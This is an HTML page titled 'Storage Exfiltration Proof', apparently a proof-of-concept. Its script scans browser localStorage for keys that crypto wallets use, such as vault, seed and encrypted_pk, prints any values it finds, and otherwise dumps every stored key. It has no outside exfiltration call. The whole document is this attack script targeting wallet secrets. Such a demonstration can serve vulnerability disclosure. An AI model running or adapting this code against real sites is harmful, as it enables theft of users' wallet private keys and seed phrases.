<!DOCTYPE html>
<html>
<head>
    <title>Storage Exfiltration Proof</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
        .data-found { color: #fff; border: 1px solid #0f0; padding: 10px; margin-top: 10px; }
    </style>
</head>
<body>
    <h3>[+] Real Storage Exfiltration Scan</h3>
    <div id="results"></div>

    <script>
        const resultsDiv = document.getElementById('results');
        
        // Daftar key yang sering digunakan dompet kripto untuk menyimpan data
        const sensitiveKeys = ['vault', 'wallet_data', 'encrypted_pk', 'seed', 'enc_pk', 'user_vault'];

        resultsDiv.innerHTML += "Scanning for sensitive keys...<br>";

        let found = false;
        sensitiveKeys.forEach(key => {
            const data = localStorage.getItem(key);
            if (data) {
                found = true;
                resultsDiv.innerHTML += `<div class="data-found">
                    <b>FOUND KEY: ${key}</b><br>
                    <b>VALUE:</b> <pre>${data}</pre>
                </div>`;
            }
        });

        if (!found) {
            resultsDiv.innerHTML += "No common wallet keys found. Scanning all storage...<br>";
            for (let i = 0; i < localStorage.length; i++) {
                const k = localStorage.key(i);
                resultsDiv.innerHTML += `Key: ${k} | Value: ${localStorage.getItem(k).substring(0, 30)}...<br>`;
            }
        }
    </script>
</body>
</html>
